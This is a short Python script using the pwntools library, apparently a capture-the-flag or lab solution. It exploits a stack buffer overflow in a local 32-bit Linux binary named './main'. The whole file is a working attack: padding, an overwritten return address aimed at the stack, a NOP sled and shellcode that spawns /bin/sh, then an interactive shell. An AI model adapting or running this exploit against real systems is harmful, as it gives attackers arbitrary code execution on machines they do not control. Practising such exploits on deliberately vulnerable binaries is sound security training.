
from pwn import *

SHELLCODE = asm(pwnlib.shellcraft.i386.linux.sh())
STACK_BUFFER = 0xffffcf00 + 400

#s = process("./main")

# Uncomment for debugging
s = process("./main")
# gdb.attach(s, '''
# 	b*0x080484b4
# 	''')

payload = 'A'*128
payload += 'BBBB' # EBP
payload += p32(STACK_BUFFER)
payload += '\x90'*1500
payload += SHELLCODE

payload += '\n'
s.send(payload)
print(s.recv())
s.interactive()
s.close()